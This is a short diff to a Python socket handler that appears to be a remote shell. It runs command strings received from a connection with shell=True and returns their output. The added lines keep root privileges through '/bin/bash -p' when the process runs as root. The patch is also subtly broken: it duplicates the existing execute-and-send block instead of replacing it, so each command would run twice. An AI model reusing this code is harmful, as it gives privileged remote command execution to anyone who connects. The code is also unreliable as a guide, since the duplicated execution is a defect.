@@ -191,6 +191,12 @@ def handle_conn(conn, addr):
                 # output = result.stdout + result.stderr
                 # # conn.sendall(output.encode("utf-8", errors="replace"))
                 # send_framed(conn, output if output else b"[no output]")
+                if os.geteuid() == 0:
+                    command_body = f"/bin/bash -p -c {subprocess.list2cmdline([command_body])}"
+                
+                proc = subprocess.run(command_body, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                output = proc.stdout + proc.stderr
+                send_framed(conn, output if output else b"[no output]")
                 proc = subprocess.run(command_body, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 output = proc.stdout + proc.stderr  # both are bytes now, not strings
                 send_framed(conn, output if output else b"[no output]")
